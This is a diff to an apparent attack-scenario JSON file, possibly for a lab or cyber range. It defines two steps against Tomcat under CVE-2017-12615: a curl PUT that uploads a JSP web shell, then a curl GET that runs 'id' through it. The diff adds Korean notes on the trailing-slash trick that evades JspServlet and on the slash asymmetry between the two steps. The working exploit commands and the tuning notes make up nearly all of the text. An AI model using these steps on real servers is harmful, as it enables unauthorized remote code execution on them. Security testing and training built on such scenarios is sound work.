@@ -11,10 +11,10 @@
     "steps": [
       {"id": "STEP-corp-tomcat-put", "seq": 1,
        "command": "curl -s -X PUT --data-binary @shell.jsp 'http://waf.corp-dmz.svc.cluster.local/shell.jsp/'",
-       "description": "PUT 으로 .jsp 웹셸 업로드(끝 슬래시 트릭, CVE-2017-12615)"},
+       "description": "PUT 으로 .jsp 웹셸 업로드. ★ URL 끝 '/' 필수 — JspServlet 이 .jsp 요청을 가로채는 걸 우회(CVE-2017-12615 핵심). 없으면 404. 저장된 파일명은 '/' 떼고 shell.jsp."},
       {"id": "STEP-corp-tomcat-exec", "seq": 2,
        "command": "curl -s 'http://waf.corp-dmz.svc.cluster.local/shell.jsp?cmd=id'",
-       "description": "웹셸 GET 실행 → DMZ 원격코드실행"}
+       "description": "웹셸 GET 실행 → DMZ 원격코드실행. ★ 주의: URL 끝 '/' 금지 — 저장된 파일명은 shell.jsp (슬래시 없음). GET URL 에 '/' 붙이면 디렉토리 요청으로 처리돼 미응답. step1 과 다름(비대칭)."}
     ]
   },
   "preconditions": [
